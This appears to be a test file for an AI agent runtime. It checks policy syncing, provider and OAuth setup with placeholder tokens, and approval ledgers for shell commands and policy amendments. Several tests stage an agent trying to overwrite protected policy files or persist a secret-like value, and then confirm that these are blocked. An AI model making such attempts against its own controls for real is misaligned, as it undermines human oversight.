    expect(await manager.isPolicyMirrorCurrent()).toBe(true);
    const policyMarkdown = await readFile(join(root, "codex", "POLICY.md"), "utf8");
    expect(policyMarkdown).toContain("## Core Runtime Tools");
    expect(policyMarkdown).not.toContain("git_status");

    await writeFile(join(root, "codex", "POLICY.md"), "# stale again\n", "utf8");
    await manager.syncMarkdown();
    const synced = await manager.checkPolicy();
    expect(synced.ok).toBe(true);

    await writeFile(join(root, "codex", "POLICY.json"), "{}", "utf8");
    const invalid = await manager.checkPolicy();
    expect(invalid.jsonValid).toBe(false);
  });

  it("auto-syncs stale policy mirrors before run prompt assembly", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Policy repair before run");
    await writeFile(join(root, "codex", "POLICY.md"), "# stale runtime policy\n", "utf8");
    const events: string[] = [];

    await runSession(root, {
      sessionId: session.id,
      prompt: "Smoke test",
      providerId: "mock",
      onEvent: (message) => events.push(message)
    });

    expect(events).toContain("policy mirror synced from POLICY.json");
    expect(await new PolicyManager(root).isPolicyMirrorCurrent()).toBe(true);
  });

  it("loads runtime config separately from law policy and checks migration preview", async () => {
    const root = await initializedWorkspace();
    const rawPolicy = JSON.parse(await readFile(join(root, "codex", "POLICY.json"), "utf8")) as Record<string, unknown>;
    expect(rawPolicy.promptBudget).toBeUndefined();

    await writeRuntimeLocal(root, {
      model: {
        providers: {
          openrouter: {
            enabled: true,
            model: "openrouter/test-model"
          }
        }
      },
      connectors: {
        telegram: {
          enabled: true,
          allowedChatIds: ["123"]
        }
      }
    });
    const policy = await new PolicyManager(root).loadPolicy();
    expect(policy.model.providers.openrouter.enabled).toBe(true);
    expect(policy.model.providers.openrouter.model).toBe("openrouter/test-model");
    expect(policy.connectors.telegram.allowedChatIds).toEqual(["123"]);
    expect(await formatConfigCheck(root, rawPolicy)).toContain("Schema: ok");
    expect(await formatConfigShow(root, rawPolicy)).toContain("runtime.local.json");
    expect((deepMerge({ a: { b: 1, c: [1] } }, { a: { c: [2] } }) as { a: { b: number; c: number[] } }).a)
      .toEqual({ b: 1, c: [2] });

    const migration = await buildRuntimeConfigMigration(root);
    expect(migration.preview).toContain("Runtime config migration preview");
    expect(await formatConfigShow(root, rawPolicy)).not.toContain("tools.bundled.git_status.enabled");
  });

  it("starts without an active provider profile and stores provider secrets privately", async () => {
    const root = await initializedWorkspace();
    const policy = await new PolicyManager(root).loadPolicy();

    expect(policy.model.activeProviderProfile).toBeUndefined();
    expect(policy.model.providers["openai-codex"].enabled).toBe(false);
    expect(policy.model.providers["codex-cli"].enabled).toBe(false);
    expect(policy.model.providers.openrouter.enabled).toBe(false);
    await expect(runSession(root, {
      sessionId: (await new SessionManager(root).createSession("cosia-agent", "No default provider")).id,
      prompt: "hello"
    })).rejects.toThrow("No active provider profile");

    await addProviderProfile(root, "codex", {
      providerId: "openai-codex",
      oauth: true
    });
    const codexProfileProvider = createProvider("codex", root, {
      policy: await new PolicyManager(root).loadPolicy()
    });
    expect(codexProfileProvider.id).toBe("codex");
    await addProviderProfile(root, "openrouter-test", {
      providerId: "openrouter",
      apiKey: "secret-openrouter-key",
      model: "openai/gpt-test"
    });
    await useProviderProfile(root, "openrouter-test");

    const nextPolicy = await new PolicyManager(root).loadPolicy();
    expect(nextPolicy.model.activeProviderProfile).toBe("openrouter-test");
    expect(await readFile(runtimePrivatePath(root), "utf8")).toContain("\"activeProviderProfile\": \"openrouter-test\"");
    const secretText = await readFile(secretsPrivatePath(root), "utf8");
    expect(secretText).toContain("secret-openrouter-key");
    const listed = await listProviderProfileSummaries(root);
    expect(listed.find((profile) => profile.name === "openrouter-test")).toMatchObject({
      active: true,
      secretStatus: "configured via private secret"
    });
    expect(formatConfigCheck(root)).resolves.not.toContain("secret-openrouter-key");
  });

  it("lists supported provider setup paths and validates provider-specific setup fields", async () => {
    const supported = formatSupportedProviders();
    expect(supported).toContain("Supported provider setup paths");
    expect(supported).toContain("openai-codex");
    expect(supported).toContain("codex-cli");
    expect(supported).toContain("openrouter");
    expect(supported).toContain("openai-compatible");
    expect(supported).toContain("No provider is selected by default.");

    expect(() => validateProviderProfileAddOptions("bad", {
      providerId: "unknown",
      oauth: true
    })).toThrow("Unsupported provider");
    expect(() => validateProviderProfileAddOptions("openrouter", {
      providerId: "openrouter",
      oauth: true
    })).toThrow("does not support oauth auth");
    expect(() => validateProviderProfileAddOptions("openai", {
      providerId: "openai-compatible",
      apiKey: "secret"
    })).toThrow("requires --model");
    expect(() => validateProviderProfileAddOptions("openai", {
      providerId: "openai-compatible",
      apiKey: "secret",
      model: "gpt-test"
    })).toThrow("requires --base-url");
    expect(validateProviderProfileAddOptions("openai", {
      providerId: "openai-compatible",
      apiKeyEnv: "OPENAI_API_KEY",
      model: "gpt-test",
      baseUrl: "https://example.test/v1"
    })).toMatchObject({
      providerId: "openai-compatible",
      apiKeyEnv: "OPENAI_API_KEY"
    });
    expect(validateProviderProfileAddOptions("codex", {
      providerId: "openai-codex",
      oauth: true
    })).toMatchObject({
      providerId: "openai-codex",
      oauth: true
    });
    expect(missingProviderProfileHint()).toContain("cosia provider setup");
  });

  it("defines an OpenAI Codex OAuth boundary without storing token values in profile output", async () => {
    const root = await initializedWorkspace();
    const handler = oauthHandlerForProvider("openai-codex");
    expect(handler?.beginOAuthSetup()).toMatchObject({
      ok: true,
      mode: "cosia_owned_token_sink"
    });
    const legacyHandler = oauthHandlerForProvider("codex-cli");
    expect(legacyHandler?.beginOAuthSetup()).toMatchObject({
      ok: true,
      mode: "external_cli_delegation"
    });

    await addProviderProfile(root, "codex", {
      providerId: "openai-codex",
      oauth: true
    });
    expect(await loadPrivateSecrets(root)).toEqual({
      version: 1,
      providers: {},
      connectors: {}
    });

    await savePrivateSecrets(root, {
      version: 1,
      providers: {
        future: {
          oauth: {
            accessToken: "access-secret",
            refreshToken: "refresh-secret",
            expiresAt: "2099-01-01T00:00:00.000Z",
            tokenType: "Bearer",
            scope: "test",
            accountId: "acct-test",
            providerId: "openai-codex",
            source: "cosia-owned-oauth"
          }
        }
      },
      connectors: {}
    });
    const normalized = await loadPrivateSecrets(root);
    expect(normalized.providers.future.oauth?.accessToken).toBe("access-secret");
    expect(normalized.providers.future.oauth?.accountId).toBe("acct-test");
    expect(JSON.stringify(await listProviderProfileSummaries(root))).not.toContain("access-secret");
  });

  it("uses openai-codex OAuth tokens from the private token sink without app-server threads", async () => {
    const root = await initializedWorkspace();
    await addProviderProfile(root, "codex", {
      providerId: "openai-codex",
      oauth: true
    });
    await useProviderProfile(root, "codex");
    await savePrivateSecrets(root, {
      version: 1,
      providers: {
        codex: {
          oauth: {
            accessToken: "access-secret",
            refreshToken: "refresh-secret",
            expiresAt: "2099-01-01T00:00:00.000Z",
            tokenType: "Bearer",
            scope: "test",
            accountId: "acct-test",
            providerId: "openai-codex",
            source: "cosia-owned-oauth"
          }
        }
      },
      connectors: {}
    });
    const requests: Array<{ url: string; init?: RequestInit }> = [];
    const fetchImpl: FetchLike = async (input, init) => {
      requests.push({ url: String(input), init });
      return new Response([
        "data: {\"type\":\"response.output_text.delta\",\"delta\":\"{\\\"type\\\":\\\"final\\\",\\\"content\\\":\\\"ok\\\"}\"}",
        "",
        "data: {\"type\":\"response.completed\",\"response\":{\"status\":\"completed\",\"usage\":{\"prompt_tokens\":1200,\"completion_tokens\":40,\"total_tokens\":1240,\"prompt_tokens_details\":{\"cached_tokens\":1024}}}}",
        "",
        "data: [DONE]",
        ""
      ].join("\n"), {
        status: 200,
        headers: { "content-type": "text/event-stream" }
      });
    };
    const provider = createProvider("codex", root, {
      policy: await new PolicyManager(root).loadPolicy(),
      fetchImpl
    });
    const result = await provider.complete({ sessionId: "session-test", prompt: "hello" });
    expect(result.raw).toContain("\"content\":\"ok\"");
    expect(requests).toHaveLength(1);
    expect(requests[0].url).toContain("/codex/responses");
    const headers = requests[0].init?.headers as Record<string, string>;
    expect(headers.Authorization).toBe("Bearer access-secret");
    expect(headers.accept).toBe("text/event-stream");
    expect(headers["OpenAI-Beta"]).toBe("responses=v1");
    expect((requests[0].init?.headers as Record<string, string>)["chatgpt-account-id"]).toBe("acct-test");
    expect(headers.session_id).toBe("session-test");
    const body = JSON.parse(String(requests[0].init?.body)) as Record<string, unknown>;
    expect(body.model).toBe("gpt-5.5");
    expect(body.stream).toBe(true);
    expect(body.store).toBe(false);
    expect(String(body.prompt_cache_key)).toMatch(/^cosia:openai-codex:[a-f0-9]{16}$/);
    expect(String(body.instructions)).toContain("Return exactly one AgentStep JSON object");
    const providerResponseDebug = await readFile(join(root, "sessions", "session-test", "debug", "LAST_PROVIDER_RESPONSE.md"), "utf8");
    expect(providerResponseDebug).toContain("# LAST PROVIDER RESPONSE");
    expect(providerResponseDebug).toContain("\"cachedTokens\": 1024");
    expect(providerResponseDebug).toContain("\"prompt_tokens_details\"");
    expect(providerResponseDebug).not.toContain("access-secret");
  });

  it("includes safe request diagnostics when openai-codex backend returns an HTML 403", async () => {
    const root = await initializedWorkspace();
    await addProviderProfile(root, "codex", {
      providerId: "openai-codex",
      oauth: true
    });
    await useProviderProfile(root, "codex");
    await savePrivateSecrets(root, {
      version: 1,
      providers: {
        codex: {
          oauth: {
            accessToken: "expired-access-secret",
            refreshToken: "refresh-secret",
            expiresAt: "2000-01-01T00:00:00.000Z",
            tokenType: "Bearer",
            scope: "test",
            accountId: "acct-test",
            providerId: "openai-codex",
            source: "cosia-owned-oauth"
          }
        }
      },
      connectors: {}
    });
    const fetchImpl: FetchLike = async (input) => {
      const url = String(input);
      if (url.includes("/oauth/token")) {
        return new Response(JSON.stringify({
          access_token: "refreshed-access-secret",
          refresh_token: "refresh-secret",
          expires_in: 3600,
          token_type: "Bearer",
          scope: "test"
        }), {
          status: 200,
          headers: { "content-type": "application/json" }
        });
      }
      return new Response("<html>blocked</html>", {
        status: 403,
        headers: {
          "content-type": "text/html",
          "cf-ray": "cf-test",
          "x-oai-request-id": "req-test"
        }
      });
    };
    const provider = createProvider("codex", root, {
      policy: await new PolicyManager(root).loadPolicy(),
      fetchImpl
    });
    let error: unknown;
    try {
      await provider.complete({ sessionId: "session-test", prompt: "hello" });
    } catch (caught) {
      error = caught;
    }
    expect(error).toBeInstanceOf(ProviderError);
    const providerError = error as ProviderError;
    expect(providerError.reason).toBe("auth_failed");
    expect(providerError.preview).toContain("status: 403");
    expect(providerError.preview).toContain("contentType: text/html");
    expect(providerError.preview).toContain("xOaiRequestId: req-test");
    expect(providerError.preview).toContain("cfRay: cf-test");
    expect(providerError.preview).toContain("endpointFamily: chatgpt_backend");
    expect(providerError.preview).toContain("hasAccountId: yes");
    expect(providerError.preview).toContain("bodyKeys:");
    expect(providerError.preview).toContain("inputIsArray: yes");
    expect(providerError.preview).toContain("instructionsLength:");
    expect(providerError.preview).toContain("store: false");
    expect(providerError.preview).toContain("stream: true");
    expect(providerError.preview).toContain("unsupportedKeys: none");
    expect(providerError.preview).not.toContain("refreshed-access-secret");
    expect(providerError.preview).not.toContain("refresh-secret");
  });

  it("normalizes COSIA prompt sections into Codex instructions and input messages", async () => {
    const root = await initializedWorkspace();
    await addProviderProfile(root, "codex", {
      providerId: "openai-codex",
      oauth: true
    });
    await useProviderProfile(root, "codex");
    await savePrivateSecrets(root, {
      version: 1,
      providers: {
        codex: {
          oauth: {
            accessToken: "access-secret",
            refreshToken: "refresh-secret",
            expiresAt: "2099-01-01T00:00:00.000Z",
            tokenType: "Bearer",
            scope: "test",
            accountId: "acct-test",
            providerId: "openai-codex",
            source: "cosia-owned-oauth"
          }
        }
      },
      connectors: {}
    });
    const requests: Array<{ url: string; init?: RequestInit }> = [];
    const fetchImpl: FetchLike = async (input, init) => {
      requests.push({ url: String(input), init });
      return new Response([
        "data: {\"type\":\"response.output_text.delta\",\"delta\":\"{\\\"type\\\":\\\"final\\\",\\\"content\\\":\\\"ok\\\"}\"}",
        "",
        "data: [DONE]",
        ""
      ].join("\n"), {
        status: 200,
        headers: { "content-type": "text/event-stream" }
      });
    };
    const provider = createProvider("codex", root, {
      policy: await new PolicyManager(root).loadPolicy(),
      fetchImpl
    });
    const prompt = [
      "# BEGIN codex/SECURITY.md",
      "RAW SECURITY LAW SHOULD NOT BE SENT VERBATIM",
      "# END codex/SECURITY.md",
      "",
      "# BEGIN AGENT STYLE",
      "Speak warmly.",
      "# END AGENT STYLE",
      "",
      "# BEGIN sessions/session-test/SESSION_RULES.md",
      "# SESSION RULES",
      "",
      "Prefer concise answers in this session.",
      "# END sessions/session-test/SESSION_RULES.md",
      "",
      "# BEGIN sessions/session-test/CONTEXT_MEMORY.md",
      "Prior context.",
      "# END sessions/session-test/CONTEXT_MEMORY.md",
      "",
      "# BEGIN RUNTIME OUTPUT CONTRACT",
      "Return only JSON.",
      "# END RUNTIME OUTPUT CONTRACT",
      "",
      "# BEGIN ACTIVE TOOL STATE",
      "Available tools for this run: read_file, write_file, search_files",
      "Maximum tool loop depth: 5",
      "# END ACTIVE TOOL STATE",
      "",
      "# BEGIN REQUIRE-TOOLS MODE",
      "This run is in require-tools mode.",
      "# END REQUIRE-TOOLS MODE",
      "",
      "# BEGIN FILE-READ REQUIREMENT",
      "The current request asks to inspect actual files.",
      "# END FILE-READ REQUIREMENT",
      "",
      "# BEGIN TOOL LOOP CONTROL",
      "Remaining executable tool calls: 5.",
      "# END TOOL LOOP CONTROL",
      "",
      "# BEGIN CURRENT USER REQUEST",
      "방금 맥락을 보고 Say ok.",
      "# END CURRENT USER REQUEST"
    ].join("\n");
    const result = await provider.complete({ sessionId: "session-test", prompt });
    expect(result.raw).toContain("\"content\":\"ok\"");
    const body = JSON.parse(String(requests[0].init?.body)) as { instructions: string; input: Array<{ content: Array<{ text: string }> }> };
    expect(body.instructions).toContain("codex/SECURITY.md");
    expect(body.instructions).toContain("RAW SECURITY LAW SHOULD NOT BE SENT VERBATIM");
    expect(body.instructions).toContain("Speak warmly.");
    expect(body.instructions).toContain("Return only JSON.");
    expect(body.instructions).not.toContain("SESSION_RULES.md");
    expect(body.instructions).not.toContain("Prefer concise answers in this session.");
    expect(body.instructions).not.toContain("Available tools for this run");
    expect(body.instructions).not.toContain("This run is in require-tools mode");
    expect(body.instructions).not.toContain("The current request asks to inspect actual files.");
    expect(body.instructions).not.toContain("Remaining executable tool calls");
    expect(body.input).toHaveLength(2);
    expect(body.input[0].content[0].text).toContain("Prefer concise answers in this session.");
    expect(body.input[0].content[0].text).toContain("Prior context.");
    expect(body.input[0].content[0].text).toContain("Available tools for this run: read_file, write_file, search_files");
    expect(body.input[0].content[0].text).toContain("This run is in require-tools mode.");
    expect(body.input[0].content[0].text).toContain("The current request asks to inspect actual files.");
    expect(body.input[0].content[0].text).toContain("Remaining executable tool calls: 5.");
    expect(body.input[1].content[0].text).toBe("방금 맥락을 보고 Say ok.");
    const providerPromptDebug = await readFile(join(root, "sessions", "session-test", "debug", "LAST_PROVIDER_PROMPT.md"), "utf8");
    expect(providerPromptDebug).toContain("# LAST PROVIDER PROMPT");
    expect(providerPromptDebug).toContain("cosia:openai-codex:");
    expect(providerPromptDebug).toContain("## Instructions");
    expect(providerPromptDebug).toContain("RAW SECURITY LAW SHOULD NOT BE SENT VERBATIM");
    expect(providerPromptDebug).toContain("## Input Messages");
    expect(providerPromptDebug).toContain("Prior context.");
    expect(providerPromptDebug).not.toContain("access-secret");
  });

  it("keeps session context as input for simple openai-codex requests", async () => {
    const root = await initializedWorkspace();
    await addProviderProfile(root, "codex", {
      providerId: "openai-codex",
      oauth: true
    });
    await useProviderProfile(root, "codex");
    await savePrivateSecrets(root, {
      version: 1,
      providers: {
        codex: {
          oauth: {
            accessToken: "access-secret",
            refreshToken: "refresh-secret",
            expiresAt: "2099-01-01T00:00:00.000Z",
            tokenType: "Bearer",
            scope: "test",
            accountId: "acct-test",
            providerId: "openai-codex",
            source: "cosia-owned-oauth"
          }
        }
      },
      connectors: {}
    });
    const requests: Array<{ url: string; init?: RequestInit }> = [];
    const fetchImpl: FetchLike = async (input, init) => {
      requests.push({ url: String(input), init });
      return new Response([
        "data: {\"type\":\"response.output_text.delta\",\"delta\":\"{\\\"type\\\":\\\"final\\\",\\\"content\\\":\\\"ok\\\"}\"}",
        "",
        "data: [DONE]",
        ""
      ].join("\n"), {
        status: 200,
        headers: { "content-type": "text/event-stream" }
      });
    };
    const provider = createProvider("codex", root, {
      policy: await new PolicyManager(root).loadPolicy(),
      fetchImpl
    });
    const prompt = [
      "# BEGIN sessions/session-test/CONTEXT_MEMORY.md",
      "cosia tool grow test grow_abc --yes",
      "Provider codex failed HTTP 403.",
      "Friendly prior chat.",
      "# END sessions/session-test/CONTEXT_MEMORY.md",
      "",
      "# BEGIN CURRENT USER REQUEST",
      "쿠미?",
      "# END CURRENT USER REQUEST"
    ].join("\n");
    await provider.complete({ sessionId: "session-test", prompt });
    const body = JSON.parse(String(requests[0].init?.body)) as { input: Array<{ content: Array<{ text: string }> }> };
    expect(body.input).toHaveLength(2);
    expect(body.input[0].content[0].text).toContain("cosia tool grow test grow_abc --yes");
    expect(body.input[0].content[0].text).toContain("Provider codex failed HTTP 403.");
    expect(body.input[0].content[0].text).toContain("Friendly prior chat.");
    expect(body.input[1].content[0].text).toBe("쿠미?");
  });

  it("validates unknown bundled tool runtime config and removes legacy dedicated policy tools", async () => {
    const root = await initializedWorkspace();
    await writeRuntimeLocal(root, {
      tools: {
        bundled: {
          custom_git: {
            enabled: "false"
          }
        }
      }
    });
    expect(await formatConfigCheck(root)).toContain("Schema: failed");

    await writeRuntimeLocal(root, {
      tools: {
        bundled: {
          custom_git: {
            enabled: true,
            permission: "write_local"
          }
        }
      }
    });
    expect(await formatConfigCheck(root)).toContain("Unrecognized key");

    await writeRuntimeLocal(root, {
      tools: {
        bundled: {
          custom_git: {
            enabled: true
          }
        }
      }
    });
    const unknown = await formatConfigCheck(root);
    expect(unknown).toContain("config.unknown_bundled_tool");

    const policyPath = join(root, "codex", "POLICY.json");
    const rawPolicy = JSON.parse(await readFile(policyPath, "utf8")) as {
      tools: Record<string, unknown>;
    };
    rawPolicy.tools.git_status = {
      permission: "read_only",
      workspace: "inside_only",
      enabled: false
    };
    rawPolicy.tools.git_diff = {
      permission: "read_only",
      workspace: "inside_only",
      enabled: true
    };
    rawPolicy.tools.npm_test = {
      permission: "project_check",
      workspace: "inside_only",
      enabled: false
    };
    await writeFile(policyPath, `${JSON.stringify(rawPolicy, null, 2)}\n`, "utf8");
    await rm(runtimeLocalPath(root), { force: true });

    const migration = await buildRuntimeConfigMigration(root);
    expect((migration.lawPolicy.tools as Record<string, unknown>).git_status).toBeUndefined();
    expect((migration.lawPolicy.tools as Record<string, unknown>).npm_test).toBeUndefined();
    expect(migration.runtimeLocal.tools?.bundled?.git_status).toBeUndefined();
    expect(migration.runtimeLocal.tools?.bundled?.npm_test).toBeUndefined();
    expect(migration.preview).toContain("bundled tool defaults");
  });

  it("blocks generic write_file access to protected Codex paths", async () => {
    const root = await initializedWorkspace();
    const auditEvents: unknown[] = [];
    const result = await new ToolRegistry().execute("write_file", {
      path: "codex/POLICY.md",
      content: "# bypass"
    }, {
      workspaceRoot: root,
      allowedTools: ["write_file"],
      policyAudit: async (event) => {
        auditEvents.push(event);
      }
    });
    expect(result.ok).toBe(false);
    expect(result.content).toContain("protected Codex path");
    expect(JSON.stringify(auditEvents)).toContain("codex.protected_path");
  });

  it("blocks generic write_file access to system-level boundary paths", async () => {
    const root = await initializedWorkspace();
    const registry = new ToolRegistry();

    const configWrite = await registry.execute("write_file", {
      path: "config/runtime.private.json",
      content: "{}"
    }, {
      workspaceRoot: root,
      allowedTools: ["write_file"]
    });
    expect(configWrite.ok).toBe(false);
    expect(configWrite.content).toContain("system-level boundary path");
    expect(configWrite.content).toContain("Final user approval");

    const styleWrite = await registry.execute("write_file", {
      path: "agents/cosia-agent/STYLE.md",
      content: "# STYLE\n\n- test style update\n"
    }, {
      workspaceRoot: root,
      allowedTools: ["write_file"]
    });
    expect(styleWrite.ok).toBe(true);
    expect(styleWrite.content).toContain("delegated under active Policy");
  });

  it("previews and applies protected Codex source changes through amendment ledger", async () => {
    const root = await initializedWorkspace();
    const ledger = new CodexAmendmentLedger(root);
    const originalRules = await readFile(join(root, "codex", "RULES.md"), "utf8");
    const proposedRules = `${originalRules.trimEnd()}\n- Test amendment rule.\n`;

    await expect(ledger.propose({
      targetPath: "codex/POLICY.md",
      proposedContent: "# mirror bypass",
      reason: "Attempt direct mirror edit.",
      sourceChannel: "cli"
    })).rejects.toThrow("Generated Codex mirror cannot be amended directly");

    await expect(ledger.propose({
      targetPath: "codex/RULES.md",
      proposedContent: "token = abcdefghijklmnopqrstuvwxyz",
      reason: "Attempt secret persistence.",
      sourceChannel: "cli"
    })).rejects.toThrow("secret-like values");

    const amendment = await ledger.propose({
      targetPath: "codex/RULES.md",
      proposedContent: proposedRules,
      reason: "Add test rule.",
      sourceChannel: "cli"
    });
    expect(amendment.status).toBe("pending");
    expect(ledger.list().map((item) => item.id)).toContain(amendment.id);
    expect(await readFile(join(root, "codex", "RULES.md"), "utf8")).toBe(originalRules);

    const applied = await ledger.apply(amendment.id);
    expect(applied.status).toBe("applied");
    expect(await readFile(join(root, "codex", "RULES.md"), "utf8")).toBe(proposedRules);
    await expect(ledger.apply(amendment.id)).rejects.toThrow("not pending");
  });

  it("blocks stale Codex amendment apply and syncs POLICY.md when POLICY.json is amended", async () => {
    const root = await initializedWorkspace();
    const ledger = new CodexAmendmentLedger(root);
    const stale = await ledger.propose({
      targetPath: "codex/USER.md",
      proposedContent: "# USER\n\n- stale proposal\n",
      reason: "Create stale amendment.",
      sourceChannel: "cli"
    });
    await writeFile(join(root, "codex", "USER.md"), "# USER\n\n- changed outside preview\n", "utf8");
    await expect(ledger.apply(stale.id)).rejects.toThrow("stale");
    expect(ledger.get(stale.id)?.status).toBe("stale");

    const policyPath = join(root, "codex", "POLICY.json");
    const policy = JSON.parse(await readFile(policyPath, "utf8")) as Record<string, unknown>;
    policy.version = "0.52.0-policy-amended";
    const policyAmendment = await ledger.propose({
      targetPath: "codex/POLICY.json",
      proposedContent: `${JSON.stringify(policy, null, 2)}\n`,
      reason: "Update policy version marker.",
      sourceChannel: "cli"
    });
    await ledger.apply(policyAmendment.id);
    expect(await readFile(policyPath, "utf8")).toContain("0.52.0-policy-amended");
    expect(await readFile(join(root, "codex", "POLICY.md"), "utf8")).toContain("0.52.0-policy-amended");
  });

  it("summarizes durable pending approvals and requires explicit top-level apply", async () => {
    const root = await initializedWorkspace();
    const shell = new ShellApprovalLedger(root).create({
      command: "node --version",
      reason: "Need a one-shot project check.",
      expectedEffect: "May print the Node.js version.",
      sourceChannel: "cli"
    });
    const amendment = await new CodexAmendmentLedger(root).propose({
      targetPath: "codex/USER.md",
      proposedContent: "# USER\n\n- pending approval test\n",
      reason: "Test unified pending approval surface.",
      sourceChannel: "cli"
    });

    const summary = formatPendingApprovals(getPendingApprovalSummary(root));
    expect(summary).toContain(shell.id);
    expect(summary).toContain(amendment.id);
    expect(summary).toContain("cosia apply");
    expect(summary).toContain("Plain text approval");

    const preview = await applyPendingApproval(root, amendment.id);
    expect(preview.ok).toBe(false);
    expect(preview.content).toContain("Re-run with");
    expect(new CodexAmendmentLedger(root).get(amendment.id)?.status).toBe("pending");

    const cancelled = cancelPendingApproval(root, shell.id, "not needed");
    expect(cancelled.content).toContain("Shell approval cancelled.");
    expect(new ShellApprovalLedger(root).get(shell.id)?.status).toBe("cancelled");
  });

  it("discovers a COSIA workspace from nested directories and fails clearly outside one", async () => {
    const root = await initializedWorkspace();
    const nested = join(root, "tmp", "nested");
    await mkdir(nested, { recursive: true });

    expect(await findWorkspaceRoot(nested)).toBe(root);

    const outside = await workspace();
    await expect(requireWorkspaceRoot(outside)).rejects.toThrow("COSIA workspace not found");
  });
});

describe("capability planner", () => {
  it("collects generic facts and plans grounded capability proposals without assuming concrete tools", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "package.json"), JSON.stringify({ scripts: { test: "node --version" } }), "utf8");
    const planner = new CapabilityPlanner(root);
    const scan = await planner.scan({ userNeed: "테스트 돌려봐" });
    expect(scan.scan.scanId).toMatch(/^scan_\d{8}T\d{9}Z_[0-9a-f]{6}$/);
    expect(scan.facts.every((fact) => fact.scanId === scan.scan.scanId)).toBe(true);
    expect(scan.facts.some((fact) => fact.kind === "manifest_like_file" && fact.path === "package.json")).toBe(true);
    expect(scan.facts.some((fact) => fact.kind === "script_like_key" && fact.keys?.includes("test"))).toBe(true);

    const plan = planner.plan({ userNeed: "npm test 해줘" });
    expect(plan.proposal.sourceScanId).toBe(scan.scan.scanId);
    expect(plan.proposal.capabilityFamily).toBe("project_check");
    expect(plan.proposal.recommendedNextStep).toBe("shell_preview");
    expect(plan.proposal.confidence).toBe("medium");
    expect(plan.proposal.possibleApproaches.some((item) => item.kind === "shell_preview")).toBe(true);
    expect(JSON.stringify(plan.proposal.hypotheses).toLowerCase()).not.toContain("npm");
    expect(JSON.stringify(plan.proposal.possibleApproaches).toLowerCase()).not.toContain("npm");
    expect(new ShellApprovalLedger(root).list()).toHaveLength(0);
  });

  it("converts eligible capability proposals into linked shell approvals without generating commands", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "project.manifest.json"), JSON.stringify({ scripts: { test: "node --version" } }), "utf8");
    const planner = new CapabilityPlanner(root);
    const scan = await planner.scan({ userNeed: "테스트 돌려봐" });
    const plan = planner.plan({ userNeed: "npm test 해줘" });

    const result = planner.convertToShell(plan.proposal.id, {
      command: "node --version",
      sourceChannel: "cli",
      now: new Date(Date.parse(scan.scan.observedAt) + 1000)
    });

    expect(result.didCreate).toBe(true);
    expect(result.approval?.sourceCapabilityId).toBe(plan.proposal.id);
    expect(result.proposal.status).toBe("converted_to_shell");
    expect(result.proposal.convertedShellApprovalId).toBe(result.approval?.id);
    expect(result.proposal.convertedAt).toBeDefined();

    const stored = planner.getProposal(plan.proposal.id);
    expect(stored.convertedShellApprovalId).toBe(result.approval?.id);
    expect(stored.convertedAt).toBe(result.proposal.convertedAt);
    expect(new ShellApprovalLedger(root).list()).toHaveLength(1);

    const approvalText = JSON.stringify(result.approval);
    expect(approvalText).toContain("node --version");
    expect(result.approval?.reason).not.toContain("node --version");
    expect(result.approval?.expectedEffect).not.toContain("node --version");
    expect(result.approval?.reason.toLowerCase()).not.toContain("npm");
    expect(JSON.stringify(stored)).not.toContain("node --version");
  });

  it("uses shared shell approval construction rules for standalone and capability previews", async () => {
    const root = await initializedWorkspace();
    const now = new Date("2026-05-23T00:00:00.000Z");
    const standalone = new ShellApprovalLedger(root).create({
      command: "node --version",
      cwd: ".",
      reason: "Standalone shell preview.",
      sourceChannel: "cli",
      now
    });
    const built = buildShellApprovalRecord(root, {
      command: "node --version",
      cwd: ".",
      reason: "Capability shell preview.",
      sourceChannel: "cli",
      now,
      sourceCapabilityId: "cap_test"
    });

    expect(built.commandHash).toBe(standalone.commandHash);
    expect(built.cwdHash).toBe(standalone.cwdHash);
    expect(built.risk).toBe(standalone.risk);
    expect(built.sourceCapabilityId).toBe("cap_test");
  });

  it("does not re-convert or auto-apply proposals that already have linked shell approvals", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "project.manifest.json"), JSON.stringify({ scripts: { test: "node --version" } }), "utf8");
    const planner = new CapabilityPlanner(root);
    await planner.scan({ userNeed: "테스트 돌려봐" });
    const plan = planner.plan({ userNeed: "npm test 해줘" });
    const first = planner.convertToShell(plan.proposal.id, {
      command: "node --version",
      sourceChannel: "cli"
    });

    const second = planner.convertToShell(plan.proposal.id, {
      command: "echo should-not-run",
      sourceChannel: "cli"
    });

    expect(second.didCreate).toBe(false);
    expect(second.shouldExitNonZero).toBe(true);
    expect(second.approval?.id).toBe(first.approval?.id);
    expect(second.message).toContain("Provided command was not used.");
    expect(second.message).toContain(`cosia shell apply ${first.approval?.id}`);
    expect(new ShellApprovalLedger(root).list()).toHaveLength(1);
    expect(new ShellApprovalLedger(root).get(first.approval!.id)?.status).toBe("pending");
  });

  it("rejects stale or missing source scans during capability shell conversion", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "project.manifest.json"), JSON.stringify({ scripts: { test: "node --version" } }), "utf8");
    const planner = new CapabilityPlanner(root);
    const scan = await planner.scan({ userNeed: "테스트 돌려봐" });
    const boundary = planner.plan({ userNeed: "테스트 돌려봐", now: new Date(Date.parse(scan.scan.observedAt) + 300_000) });
    expect(() => planner.convertToShell(boundary.proposal.id, {
      command: "node --version",
      sourceChannel: "cli",
      now: new Date(Date.parse(scan.scan.observedAt) + 300_000)
    })).not.toThrow();

    await planner.scan({ userNeed: "다시 테스트 돌려봐" });
    const stalePlan = planner.plan({ userNeed: "테스트 돌려봐" });
    const staleSource = planner.listFacts({ scanId: stalePlan.proposal.sourceScanId }).scan;
    expect(() => planner.convertToShell(stalePlan.proposal.id, {
      command: "node --version",
      sourceChannel: "cli",
      now: new Date(Date.parse(staleSource.observedAt) + 300_001)
    })).toThrow(/source scan is stale/);

    const db = new DatabaseSync(join(root, "memory", "longterm.sqlite"));
    try {
      db.prepare("DELETE FROM environment_scans WHERE scan_id = ?").run(stalePlan.proposal.sourceScanId);
    } finally {
      db.close();
    }
    expect(() => planner.convertToShell(stalePlan.proposal.id, {
      command: "node --version",
      sourceChannel: "cli"
    })).toThrow(/source scan not found/);
  });

  it("rolls back partial capability shell conversion failures", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "project.manifest.json"), JSON.stringify({ scripts: { test: "node --version" } }), "utf8");
    const planner = new CapabilityPlanner(root);
